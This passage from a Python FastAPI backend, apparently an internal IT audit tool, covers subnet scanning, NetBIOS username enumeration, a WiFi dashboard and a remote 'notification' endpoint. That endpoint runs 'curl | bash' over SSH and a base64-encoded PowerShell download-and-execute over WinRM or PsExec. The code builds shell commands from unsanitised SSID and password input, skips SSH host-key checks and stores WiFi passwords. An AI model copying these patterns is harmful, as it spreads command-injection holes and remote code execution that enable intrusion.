@app.post("/discover/network-scan")
def network_scan(request: NetworkScanRequest):
    try:
        network = ipaddress.ip_network(request.ip_range, strict=False)
        hosts   = list(network.hosts())
        if len(hosts) > 512:
            raise HTTPException(status_code=400, detail="IP range too large. Use /23 or smaller.")
    except ValueError as e:
        raise HTTPException(status_code=400, detail=f"Invalid IP range: {e}")

    common_ports  = [22, 23, 80, 135, 443, 445, 3389, 8080, 8443, 9100]
    timeout_secs  = max(0.1, min(request.timeout_ms / 1000, 2.0))

    PORT_LABELS = {
        22: "SSH", 23: "Telnet", 80: "HTTP", 135: "RPC",
        443: "HTTPS", 445: "SMB", 3389: "RDP",
        8080: "HTTP-Alt", 8443: "HTTPS-Alt", 9100: "Printer/JetDirect"
    }

    def guess_device_type(open_ports):
        if 3389 in open_ports and 445 in open_ports:
            return "Windows Workstation/Server"
        if 445 in open_ports and 135 in open_ports:
            return "Windows Host"
        if 22 in open_ports and 80 not in open_ports and 443 not in open_ports:
            return "Linux/Unix Server"
        if 23 in open_ports:
            return "Network Device (Router/Switch)"
        if 9100 in open_ports:
            return "Network Printer"
        if 80 in open_ports or 443 in open_ports:
            return "Web Service / Network Device"
        return "Unknown Device"

    def _resolve_host(ip_str: str) -> str:
        """Try reverse DNS (gethostbyaddr), fall back to getfqdn, then IP."""
        try:
            name, _, _ = socket.gethostbyaddr(ip_str)
            if name and name != ip_str:
                return name.split(".")[0]   # short hostname, cleaner display
        except Exception:
            pass
        try:
            fqdn = socket.getfqdn(ip_str)
            if fqdn and fqdn != ip_str:
                return fqdn
        except Exception:
            pass
        return ip_str   # always return the IP, never "N/A"

    def scan_host(ip):
        ip_str     = str(ip)
        open_ports = []
        hostname   = _resolve_host(ip_str)

        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout_secs)
                if sock.connect_ex((ip_str, port)) == 0:
                    open_ports.append(port)
                sock.close()
            except Exception:
                pass

        if open_ports:
            port_labels = [f"{p} ({PORT_LABELS.get(p, 'Unknown')})" for p in open_ports]
            return {
                "ip":          ip_str,
                "hostname":    hostname,
                "open_ports":  open_ports,
                "port_labels": port_labels,
                "device_type": guess_device_type(open_ports),
                "status":      "online",
            }
        return None

    logger.info(f"Starting network scan: {request.ip_range}")

    # ─────────────────────────────────────────────────────────────────────────
    # Step 1: Fast ICMP Ping Sweep — populates ARP cache for ALL live devices
    # including mobiles and firewalled laptops that block TCP ports.
    # ─────────────────────────────────────────────────────────────────────────
    def ping_host(ip_str: str):
        try:
            if platform.system() == "Windows":
                cmd = ["ping", "-n", "1", "-w", "500", str(ip_str)]
            else:
                cmd = ["ping", "-c", "1", "-W", "1", str(ip_str)]
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
        except Exception:
            pass

    logger.info("Running ping sweep to populate ARP cache...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=128) as executor:
        executor.map(ping_host, [str(h) for h in hosts])

    # ─────────────────────────────────────────────────────────────────────────
    # Step 2: Port Scan — identifies Windows/Linux/printer devices by open ports
    # ─────────────────────────────────────────────────────────────────────────
    with concurrent.futures.ThreadPoolExecutor(max_workers=64) as executor:
        results = list(executor.map(scan_host, hosts))

    discovered_dict = {r["ip"]: r for r in results if r is not None}

    
    # ────────────────────────────────────────────────────────────────────────────
    # ARP Fallback: Discover mobile phones and firewalled devices
    # ────────────────────────────────────────────────────────────────────────────
    try:
        broadcast_ip  = str(network.broadcast_address)
        network_ip    = str(network.network_address)
        BROADCAST_MACS = {"ff-ff-ff-ff-ff-ff", "ff:ff:ff:ff:ff:ff", "00-00-00-00-00-00"}

        arp_out, _ = _run_cmd("arp -a")
        for line in arp_out.splitlines():
            line = line.strip()
            if not line:
                continue
            parts = line.split()
            if len(parts) < 3:
                continue
            entry_type = parts[2].lower() if len(parts) >= 3 else ""
            if entry_type not in ("dynamic", "static"):
                continue
            ip_str  = parts[0]
            mac_str = parts[1].lower()

            # Skip broadcast, network, and invalid MACs
            if ip_str in (broadcast_ip, network_ip):
                continue
            if mac_str in BROADCAST_MACS:
                continue

            try:
                if ipaddress.IPv4Address(ip_str) not in network:
                    continue
                if ip_str in discovered_dict:
                    continue

                hostname = _resolve_host(ip_str)

                # Guess device type by hostname pattern
                h_lower = hostname.lower()
                if any(x in h_lower for x in ["desktop", "laptop", "pc", "workstation", "win"]):
                    dev_type = "Windows Host (Firewalled)"
                elif any(x in h_lower for x in ["android", "iphone", "ipad", "samsung", "pixel"]):
                    dev_type = "Mobile Device"
                else:
                    dev_type = "Unknown Device (Firewalled)"

                discovered_dict[ip_str] = {
                    "ip":          ip_str,
                    "hostname":    hostname,
                    "open_ports":  [],
                    "port_labels": [f"MAC: {mac_str}"],
                    "device_type": dev_type,
                    "status":      "online"
                }
            except Exception:
                pass
    except Exception as e:
        logger.error(f"ARP scan fallback failed: {e}")


    discovered = list(discovered_dict.values())
    logger.info(f"Scan complete: {len(discovered)} hosts found of {len(hosts)} scanned")
    return {
        "discovered": discovered,
        "total":      len(discovered),
        "scanned":    len(hosts),
        "ip_range":   request.ip_range,
    }


# ==============================================================================
# 11. WIFI DASHBOARD
# ==============================================================================

class WifiConnectRequest(BaseModel):
    ssid: str
    password: str = ""


def _is_windows() -> bool:
    return platform.system() == "Windows"


def _run_cmd(cmd: str):
    """Run a shell command and return (stdout, returncode)."""
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=20, shell=True)
        return r.stdout, r.returncode
    except Exception as e:
        return str(e), -1


@app.get("/wifi/networks")
def get_wifi_networks():
    """List nearby WiFi networks. Supports Windows, macOS, and Linux."""
    system = platform.system()
    networks = []

    if system == "Windows":
        stdout, _ = _run_cmd("netsh wlan show networks mode=bssid")
        current: dict = {}
        for line in stdout.splitlines():
            line = line.strip()
            if re.match(r'^SSID\s+\d+\s*:', line) and "BSSID" not in line:
                if current.get("ssid"):
                    networks.append(current)
                ssid_val = line.split(":", 1)[1].strip()
                current = {"ssid": ssid_val, "authentication": "", "encryption": "", "signal": ""}
            elif line.startswith("Authentication") and ":" in line:
                current["authentication"] = line.split(":", 1)[1].strip()
            elif line.startswith("Encryption") and ":" in line:
                current["encryption"] = line.split(":", 1)[1].strip()
            elif line.startswith("Signal") and ":" in line:
                current["signal"] = line.split(":", 1)[1].strip()
        if current.get("ssid"):
            networks.append(current)

    elif system == "Darwin":
        airport = (
            "/System/Library/PrivateFrameworks/Apple80211.framework"
            "/Versions/Current/Resources/airport"
        )
        stdout, rc = _run_cmd(f'"{airport}" -s')
        if rc != 0:
            raise HTTPException(status_code=503, detail="Could not scan WiFi. Ensure WiFi adapter is enabled.")
        for line in stdout.splitlines()[1:]:  # skip header row
            if not line.strip():
                continue
            bssid_match = re.search(r'([0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2})', line)
            if not bssid_match:
                continue
            bssid_pos = line.index(bssid_match.group(0))
            ssid = line[:bssid_pos].strip()
            rest = line[bssid_pos:].split()
            try:
                rssi_val  = int(rest[1]) if len(rest) > 1 else -100
                signal_pct = str(max(0, min(100, 2 * (rssi_val + 100)))) + "%"
            except (ValueError, IndexError):
                signal_pct = "0%"
            security = " ".join(rest[5:]) if len(rest) > 5 else "Open"
            if ssid:
                networks.append({
                    "ssid": ssid,
                    "authentication": security,
                    "encryption": "AES" if any(x in security for x in ("WPA", "WEP")) else "None",
                    "signal": signal_pct,
                })

    else:
        # Linux — nmcli preferred, iwlist as fallback
        stdout, rc = _run_cmd("nmcli -t -f SSID,SECURITY,SIGNAL device wifi list")
        if rc == 0:
            for line in stdout.splitlines():
                if not line.strip():
                    continue
                # nmcli terse mode escapes literal colons as \: — split on unescaped colons only
                parts = re.split(r'(?<!\\):', line)
                ssid     = parts[0].replace("\\:", ":").strip() if len(parts) > 0 else ""
                security = parts[1].strip() if len(parts) > 1 else "Open"
                signal   = parts[2].strip() if len(parts) > 2 else "0"
                if ssid:
                    networks.append({
                        "ssid": ssid,
                        "authentication": security or "Open",
                        "encryption": "AES" if security else "None",
                        "signal": f"{signal}%",
                    })
        else:
            # iwlist fallback
            iface_out, _ = _run_cmd("iwconfig 2>/dev/null | grep 'IEEE 802' | awk '{print $1}' | head -1")
            iface = iface_out.strip() or "wlan0"
            stdout, _ = _run_cmd(f"iwlist {iface} scanning 2>/dev/null")
            current = {}
            for line in stdout.splitlines():
                line = line.strip()
                if "ESSID:" in line:
                    m = re.search(r'ESSID:"(.*?)"', line)
                    if m:
                        if current.get("ssid"):
                            networks.append(current)
                        current = {"ssid": m.group(1), "authentication": "Unknown",
                                   "encryption": "Unknown", "signal": "0%"}
                elif "Encryption key:" in line:
                    current["authentication"] = "WEP" if "on" in line.lower() else "Open"
                elif "Signal level=" in line:
                    m = re.search(r'Signal level=(-?\d+)', line)
                    if m:
                        try:
                            pct = max(0, min(100, 2 * (int(m.group(1)) + 100)))
                            current["signal"] = f"{pct}%"
                        except ValueError:
                            pass
            if current.get("ssid"):
                networks.append(current)

    # Deduplicate: keep highest signal per SSID
    seen: dict = {}
    for n in networks:
        ssid = n["ssid"]
        raw  = n.get("signal", "0%").replace("%", "")
        sig  = int(raw) if raw.isdigit() else 0
        if ssid not in seen or sig > seen[ssid]["_sig"]:
            seen[ssid] = {**n, "_sig": sig}

    result = [{k: v for k, v in net.items() if k != "_sig"} for net in seen.values()]
    result.sort(
        key=lambda x: int(x.get("signal", "0%").replace("%", ""))
        if x.get("signal", "0%").replace("%", "").isdigit() else 0,
        reverse=True,
    )
    return {"networks": result, "total": len(result)}


@app.get("/wifi/known-networks")
def get_known_networks():
    """Return list of SSIDs for which a password has been saved."""
    return {"networks": list(wifi_passwords.keys())}


@app.delete("/wifi/known-networks/{ssid}")
def forget_network(ssid: str):
    """Remove a saved WiFi password."""
    wifi_passwords.pop(ssid, None)
    _save_wifi_passwords()
    return {"status": "ok"}


@app.get("/wifi/current")
def get_current_wifi():
    """Return the current WiFi connection info including derived /24 subnet."""
    system = platform.system()

    def _derive_subnet(ip: str):
        parts = ip.split(".")
        return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24" if len(parts) == 4 else None

    if system == "Windows":
        stdout, _ = _run_cmd("netsh wlan show interfaces")
        ssid = None
        state = "disconnected"
        adapter_name = None
        for line in stdout.splitlines():
            line = line.strip()
            if line.startswith("Name") and ":" in line and "Network" not in line and "Description" not in line:
                adapter_name = line.split(":", 1)[1].strip()
            elif line.startswith("State") and ":" in line:
                state = line.split(":", 1)[1].strip().lower()
            elif re.match(r'^SSID\s*:', line) and "BSSID" not in line:
                ssid = line.split(":", 1)[1].strip()
        connected  = state == "connected" and bool(ssid)
        ip_address = None
        if connected and adapter_name:
            ip_out, _ = _run_cmd(f'netsh interface ip show addresses "{adapter_name}"')
            for ln in ip_out.splitlines():
                ln = ln.strip()
                if ln.startswith("IP Address") and ":" in ln:
                    ip_address = ln.split(":", 1)[1].strip()
                    break
        return {"connected": connected, "ssid": ssid, "state": state,
                "adapter": adapter_name, "ip": ip_address,
                "subnet": _derive_subnet(ip_address) if ip_address else None}

    elif system == "Darwin":
        airport = (
            "/System/Library/PrivateFrameworks/Apple80211.framework"
            "/Versions/Current/Resources/airport"
        )
        stdout, _ = _run_cmd(f'"{airport}" -I')
        ssid  = None
        state = "disconnected"
        for line in stdout.splitlines():
            line = line.strip()
            if re.match(r'^\s*SSID\s*:', line):
                ssid = line.split(":", 1)[1].strip()
            elif "state:" in line.lower():
                state = line.split(":", 1)[1].strip().lower()
        connected  = bool(ssid) and state != "init"
        ip_address = None
        if connected:
            # Try en0 then en1 (Wi-Fi adapter varies by model)
            for iface in ("en0", "en1"):
                out, rc = _run_cmd(f"ipconfig getifaddr {iface} 2>/dev/null")
                if rc == 0 and out.strip():
                    ip_address = out.strip()
                    break
        return {"connected": connected, "ssid": ssid, "state": state,
                "adapter": "AirPort", "ip": ip_address,
                "subnet": _derive_subnet(ip_address) if ip_address else None}

    else:
        # Linux
        ssid  = None
        iface = None
        state = "disconnected"
        stdout, rc = _run_cmd("nmcli -t -f NAME,TYPE,STATE,DEVICE connection show --active")
        if rc == 0:
            for line in stdout.splitlines():
                # nmcli terse mode escapes literal colons as \: — split on unescaped colons only
                parts = re.split(r'(?<!\\):', line)
                if len(parts) >= 4 and "wifi" in parts[1].lower() and "activated" in parts[2].lower():
                    ssid  = parts[0].replace("\\:", ":").strip()
                    iface = parts[3].strip()
                    state = "connected"
                    break
        if not ssid:
            out, rc = _run_cmd("iwgetid -r 2>/dev/null")
            if rc == 0 and out.strip():
                ssid  = out.strip()
                state = "connected"
        ip_address = None
        if iface:
            out, _ = _run_cmd(f"ip addr show {iface} 2>/dev/null | grep 'inet ' | awk '{{print $2}}' | cut -d/ -f1")
            ip_address = out.strip() or None
        if not ip_address:
            out, _ = _run_cmd("hostname -I 2>/dev/null | awk '{print $1}'")
            ip_address = out.strip() or None
        return {"connected": bool(ssid), "ssid": ssid, "state": state,
                "adapter": iface or "wlan0", "ip": ip_address,
                "subnet": _derive_subnet(ip_address) if ip_address else None}


@app.post("/wifi/connect")
def connect_wifi(req: WifiConnectRequest):
    """Connect to a WiFi network. Supports Windows, macOS, and Linux (nmcli)."""
    system   = platform.system()
    ssid     = req.ssid
    password = req.password

    if not ssid:
        raise HTTPException(status_code=400, detail="SSID cannot be empty.")
    # Use stored password if caller did not provide one
    if not password and ssid in wifi_passwords:
        password = wifi_passwords[ssid]
    if password and len(password) < 8:
        raise HTTPException(status_code=400, detail="WiFi password must be at least 8 characters.")

    def _persist_password():
        if password:
            wifi_passwords[ssid] = password
            _save_wifi_passwords()

    # ── macOS ──────────────────────────────────────────────────────────────────
    if system == "Darwin":
        iface_out, _ = _run_cmd(
            "networksetup -listallhardwareports "
            "| awk '/Wi-Fi|AirPort/{getline; print $2}' | head -1"
        )
        iface = iface_out.strip() or "en0"
        cmd = (f'networksetup -setairportnetwork {iface} "{ssid}" "{password}"'
               if password else f'networksetup -setairportnetwork {iface} "{ssid}"')
        out, rc = _run_cmd(cmd)
        if rc != 0 and out.strip():
            return {"status": "error", "message": out.strip()}
        for _ in range(12):
            time.sleep(1)
            cur = get_current_wifi()
            if cur.get("connected") and cur.get("ssid") == ssid and cur.get("ip"):
                _persist_password()
                return {"status": "connected", "ssid": ssid,
                        "ip": cur["ip"], "subnet": cur["subnet"]}
        _persist_password()
        return {"status": "connecting", "ssid": ssid,
                "message": "Connection initiated. Waiting for IP."}

    # ── Linux ──────────────────────────────────────────────────────────────────
    if system == "Linux":
        cmd = (f'nmcli device wifi connect "{ssid}" password "{password}"'
               if password else f'nmcli device wifi connect "{ssid}"')
        out, rc = _run_cmd(cmd)
        if rc != 0:
            return {"status": "error", "message": out.strip() or "nmcli connection failed."}
        for _ in range(12):
            time.sleep(1)
            cur = get_current_wifi()
            if cur.get("connected") and cur.get("ssid") == ssid and cur.get("ip"):
                _persist_password()
                return {"status": "connected", "ssid": ssid,
                        "ip": cur["ip"], "subnet": cur["subnet"]}
        _persist_password()
        return {"status": "connecting", "ssid": ssid,
                "message": "Connection initiated. Waiting for IP."}

    # ── Windows ────────────────────────────────────────────────────────────────
    def _xml_esc(s: str) -> str:
        return (s.replace("&", "&amp;")
                 .replace("<", "&lt;").replace(">", "&gt;")
                 .replace('"', "&quot;").replace("'", "&apos;"))

    profile_xml = (
        '<?xml version="1.0"?>\n'
        '<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">\n'
        f'    <name>{_xml_esc(ssid)}</name>\n'
        '    <SSIDConfig>\n'
        '        <SSID>\n'
        f'            <name>{_xml_esc(ssid)}</name>\n'
        '        </SSID>\n'
        '    </SSIDConfig>\n'
        '    <connectionType>ESS</connectionType>\n'
        '    <connectionMode>auto</connectionMode>\n'
        '    <MSM>\n'
        '        <security>\n'
        '            <authEncryption>\n'
        '                <authentication>WPA2PSK</authentication>\n'
        '                <encryption>AES</encryption>\n'
        '                <useOneX>false</useOneX>\n'
        '            </authEncryption>\n'
        '            <sharedKey>\n'
        '                <keyType>passPhrase</keyType>\n'
        '                <protected>false</protected>\n'
        f'                <keyMaterial>{_xml_esc(password)}</keyMaterial>\n'
        '            </sharedKey>\n'
        '        </security>\n'
        '    </MSM>\n'
        '</WLANProfile>'
    )

    tmp_path = None
    try:
        with tempfile.NamedTemporaryFile(mode="w", suffix=".xml", delete=False, encoding="utf-8") as tmp:
            tmp.write(profile_xml)
            tmp_path = tmp.name

        add_out, _ = _run_cmd(f'netsh wlan add profile filename="{tmp_path}" user=current')
        logger.info(f"WiFi add profile: {add_out.strip()}")

        conn_out, conn_rc = _run_cmd(f'netsh wlan connect name="{ssid}"')
        logger.info(f"WiFi connect: {conn_out.strip()}")

        if conn_rc != 0 and "successfully" not in conn_out.lower():
            return {"status": "error", "message": f"Connection command failed: {conn_out.strip()}"}

        # Poll for IP assignment (up to 12 s)
        for _ in range(12):
            time.sleep(1)
            cur = get_current_wifi()
            if cur.get("connected") and cur.get("ssid") == ssid and cur.get("ip"):
                _persist_password()
                return {
                    "status": "connected",
                    "ssid":   ssid,
                    "ip":     cur["ip"],
                    "subnet": cur["subnet"],
                }

        _persist_password()
        return {
            "status":  "connecting",
            "ssid":    ssid,
            "message": "Connection initiated. Waiting for IP — check status again in a moment.",
        }

    except Exception as e:
        logger.error(f"WiFi connect error: {e}")
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        if tmp_path and os.path.exists(tmp_path):
            try:
                os.remove(tmp_path)
            except Exception:
                pass


def _get_netbios_info(ip_str: str) -> dict:
    """
    Query NetBIOS Name Service (port 137) via nbtstat/nmblookup.
    Returns {"hostname": "...", "username": "..."} — empty strings if unavailable.
    nbtstat output rows:  <00> UNIQUE = computer name
                          <03> UNIQUE = messenger (logged-in user if != computer name)
                          <20> UNIQUE = file server service
    """
    result = {"hostname": "", "username": ""}
    try:
        sys_name = platform.system()
        if sys_name == "Windows":
            r = subprocess.run(
                ["nbtstat", "-a", ip_str],
                capture_output=True, text=True, timeout=4,
                creationflags=0x08000000,   # CREATE_NO_WINDOW
            )
            output = r.stdout
        else:
            r = subprocess.run(
                ["nmblookup", "-A", ip_str],
                capture_output=True, text=True, timeout=4,
            )
            output = r.stdout

        # Pass 1: get computer name (<00> UNIQUE)
        computer_name = None
        for line in output.splitlines():
            s = line.strip()
            if "<00>" in s and "UNIQUE" in s:
                parts = s.split()
                if parts:
                    computer_name = parts[0].strip()
                    result["hostname"] = computer_name
                    break

        # Pass 2: get logged-in username (<03> UNIQUE, different from computer name)
        for line in output.splitlines():
            s = line.strip()
            if "<03>" in s and "UNIQUE" in s:
                parts = s.split()
                if not parts:
                    continue
                name = parts[0].strip()
                if computer_name and name.upper() == computer_name.upper():
                    continue
                if name and name not in ("", "__MSBROWSE__"):
                    result["username"] = name
                    break
    except Exception:
        pass
    return result


@app.get("/wifi/scan-devices")
def wifi_scan_devices(subnet: str = Query(None)):
    """Scan the WiFi subnet and enrich results with stored audit data."""
    if not subnet:
        cur    = get_current_wifi()
        subnet = cur.get("subnet")

    if not subnet:
        raise HTTPException(
            status_code=400,
            detail="No subnet provided and no active WiFi connection detected.",
        )

    # Run port scan
    scan_req    = NetworkScanRequest(ip_range=subnet, timeout_ms=400)
    scan_result = network_scan(scan_req)

    # Build audit lookup: ip_address -> {computer_name, os_name, username, last_audit}
    audit_index: dict = {}

    # 1. Query PostgreSQL (preferred)
    if _db_ok():
        try:
            with _db_ctx() as conn:
                with conn.cursor(cursor_factory=RealDictCursor) as cur:
                    cur.execute("""
                        SELECT DISTINCT ON (computer_name)
                            computer_name,
                            audit_json->>'os_name'          AS os_name,
                            audit_json->'network_details'   AS network_details,
                            audit_json->'user_accounts'     AS user_accounts,
                            executed_at
                        FROM audit_results
                        ORDER BY computer_name, created_at DESC
                    """)
                    for row in cur.fetchall():
                        d = dict(row)
                        net_list = d.get("network_details") or []
                        users    = d.get("user_accounts") or []
                        # pick first non-disabled, non-system username
                        username = "—"
                        for u in users:
                            n = (u.get("name") or "").strip()
                            if n and n.lower() not in ("", "unknown") and u.get("disabled", "False") != "True":
                                username = n
                                break
                        for net in net_list:
                            raw_ip = net.get("ip_address", "")
                            for ip_part in raw_ip.split(","):
                                ip_clean = ip_part.strip()
                                if ip_clean and ip_clean not in ("Unknown", ""):
                                    audit_index[ip_clean] = {
                                        "computer_name": d.get("computer_name", "—"),
                                        "os_name":       d.get("os_name") or "Unknown",
                                        "username":      username,
                                        "last_audit":    d.get("executed_at", ""),
                                    }
        except Exception as e:
            logger.error(f"DB audit_index: {e}")

    # 2. File fallback (or supplement DB results)
    if os.path.exists(USER_INFO_DIR):
        for fn in os.listdir(USER_INFO_DIR):
            if not (fn.endswith(".json") and fn.startswith("audit_")):
                continue
            try:
                with open(f"{USER_INFO_DIR}/{fn}") as f:
                    d = json.load(f)
                users    = d.get("user_accounts", [])
                username = "—"
                for u in users:
                    n = (u.get("name") or "").strip()
                    if n and n.lower() not in ("", "unknown") and u.get("disabled", "False") != "True":
                        username = n
                        break
                for net in d.get("network_details", []):
                    raw_ip = net.get("ip_address", "")
                    for ip_part in raw_ip.split(","):
                        ip_clean = ip_part.strip()
                        if ip_clean and ip_clean not in ("Unknown", "") and ip_clean not in audit_index:
                            audit_index[ip_clean] = {
                                "computer_name": d.get("computer_name", "—"),
                                "os_name":       d.get("os_name", "Unknown"),
                                "username":      username,
                                "last_audit":    d.get("execution_datetime", ""),
                            }
            except Exception:
                pass

    # Enrich each discovered device — audited first pass
    unaudited_devices = []
    for device in scan_result["discovered"]:
        ip = device["ip"]
        if ip in audit_index:
            a = audit_index[ip]
            device["computer_name"] = a["computer_name"]
            device["os_name"]       = a["os_name"]
            device["username"]      = a["username"]
            device["last_audit"]    = a["last_audit"]
            device["audit_status"]  = "audited"
        else:
            hostname = device.get("hostname") or ip
            device["computer_name"] = hostname
            device["os_name"]       = device.get("device_type") or "Unknown Device"
            device["username"]      = "—"
            device["last_audit"]    = ""
            device["audit_status"]  = "unaudited"
            unaudited_devices.append(device)

    # Concurrently query NetBIOS for hostname + username on all unaudited devices
    if unaudited_devices:
        def _enrich_netbios(dev):
            info = _get_netbios_info(dev["ip"])
            if info["hostname"]:
                dev["computer_name"] = info["hostname"]
            if info["username"]:
                dev["username"] = info["username"]
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
            list(ex.map(_enrich_netbios, unaudited_devices))

    return scan_result


class NotificationRequest(BaseModel):
    ip_address: str
    username: str
    password: str
    method: str = "auto"
    target_os: str = "windows"
    server_url: str = ""
    message: str = "IT Compliance Audit Required"

@app.post("/audit/send-notification")
def send_notification(req: NotificationRequest):
    server_url = req.server_url or f"http://{socket.gethostbyname(socket.gethostname())}:8000"
    client_id = f"audit_{uuid.uuid4().hex[:12]}"
    results = {}

    # ── Linux / macOS via SSH ──
    if req.target_os == "linux":
        try:
            import paramiko
        except ImportError:
            paramiko = None
        if not paramiko:
            raise HTTPException(status_code=500, detail="Missing paramiko library. Install with: pip install paramiko")

        ssh_cmd = f'curl -s "{server_url}/download-mac-script?client_id={client_id}" | bash'
        try:
            logger.info(f"SSH audit on {req.ip_address} as {req.username}")
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(req.ip_address, port=22, username=req.username, password=req.password, timeout=15)
            stdin, stdout, stderr = ssh.exec_command(ssh_cmd, timeout=120)
            exit_code = stdout.channel.recv_exit_status()
            ssh.close()
            if exit_code == 0:
                return {"status": "success", "method": "ssh", "message": "Audit executed via SSH."}
            else:
                err_out = stderr.read().decode("utf-8", errors="ignore")[:500]
                results["ssh"] = err_out or f"Exit code {exit_code}"
        except Exception as e:
            logger.error(f"SSH failed on {req.ip_address}: {e}")
            results["ssh"] = str(e)

        raise HTTPException(status_code=500, detail={"message": "SSH remote audit failed.", "errors": results})

    # ── Windows via WinRM / PsExec ──
    try:
        import winrm as winrm_lib
    except ImportError:
        winrm_lib = None
    try:
        from pypsexec.client import Client as PsExecClient
    except ImportError:
        PsExecClient = None
    if not winrm_lib and not PsExecClient:
        raise HTTPException(status_code=500, detail="Missing winrm or pypsexec libraries.")
    winrm = winrm_lib

    ps_payload = f"""
$User = (Get-WmiObject -Class Win32_ComputerSystem).UserName
if (-not $User) {{ exit 1 }}
$xml = @"
<Toast>
    <visual>
        <binding template="ToastText02">
            <text id="1">IT Security Audit Required</text>
            <text id="2">Please leave this window open. IT is running a mandatory compliance scan.</text>
        </binding>
    </visual>
</Toast>
"@
$null = [Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime]
$xmlDoc = New-Object Windows.Data.Xml.Dom.XmlDocument
$xmlDoc.LoadXml($xml)
$toast = [Windows.UI.Notifications.ToastNotification]::new($xmlDoc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("IT Department")
$notifier.Show($toast)

Write-Host "==============================================" -ForegroundColor Cyan
Write-Host "    NSDL IT COMPLIANCE & SECURITY AUDIT       " -ForegroundColor Cyan
Write-Host "==============================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "A mandatory IT security audit has been initiated."
Write-Host "Please press ENTER to allow the scan to proceed..." -ForegroundColor Yellow
Read-Host

Invoke-WebRequest -Uri '{server_url}/api/get-audit-script?client_id={client_id}' -OutFile '$env:TEMP\\audit.ps1'
& '$env:TEMP\\audit.ps1'
"""

    encoded_cmd = base64.b64encode(ps_payload.encode('utf-16le')).decode('utf-8')
    cmd = f'powershell.exe -NoProfile -EncodedCommand {encoded_cmd}'

    methods_to_try = ["winrm", "psexec"] if req.method == "auto" else [req.method]

    for method in methods_to_try:
        try:
            logger.info(f"Sending notification to {req.ip_address} using {method}")
            if method == "winrm":
                s = winrm.Session(f'http://{req.ip_address}:5985/wsman', auth=(req.username, req.password), transport='ntlm')
                r = s.run_cmd(cmd)
                if r.status_code == 0:
                    return {"status": "success", "method": method, "message": "Notification sent successfully."}
                else:
                    results[method] = r.std_err.decode('utf-8', errors='ignore')
            elif method == "psexec":
                client = PsExecClient(req.ip_address, username=req.username, password=req.password)
                client.connect()
                try:
                    client.create_service()
                    stdout, stderr, rc = client.run_executable("powershell.exe", arguments=f"-WindowStyle Normal -NoProfile -EncodedCommand {encoded_cmd}", interactive=True)
                    if rc == 0:
                        return {"status": "success", "method": method, "message": "Notification sent successfully."}
                    else:
                        results[method] = stderr.decode('utf-8', errors='ignore') if stderr else f"Exit code {rc}"
                finally:
                    try:
                        client.remove_service()
                    except Exception:
                        pass
                    client.disconnect()
        except Exception as e:
            logger.error(f"Failed to send notification via {method} on {req.ip_address}: {e}")
            results[method] = str(e)

    raise HTTPException(status_code=500, detail={"message": "All attempted remote execution methods failed.", "errors": results})

@app.get("/api/get-audit-script")
def get_audit_script(request: Request, client_id: str):
    script_path = os.path.join(BASE_DIR, "scripts", "audit.ps1")
    if not os.path.exists(script_path):
        raise HTTPException(status_code=404, detail="Script not found")
    
    with open(script_path, "r", encoding="utf-8") as f:
        script_content = f.read()
        
    server_url = f"{request.url.scheme}://{request.url.netloc}"
    script_content = script_content.replace("CLIENT_ID_PLACEHOLDER", client_id)
    script_content = script_content.replace("http://127.0.0.1:8000/upload-audit", f"{server_url}/upload-audit")
    
    return PlainTextResponse(script_content)

# ==============================================================================
# 10. SERVE FRONTEND (UI)
# ==============================================================================

SCRIPTS_DIR = os.path.join(BASE_DIR, "scripts")
if os.path.exists(SCRIPTS_DIR):
    app.mount("/scripts", StaticFiles(directory=SCRIPTS_DIR), name="scripts")

FRONTEND_DIR = os.path.join(BASE_DIR, "frontend")
if os.path.exists(FRONTEND_DIR):
    app.mount("/", StaticFiles(directory=FRONTEND_DIR, html=True), name="frontend")
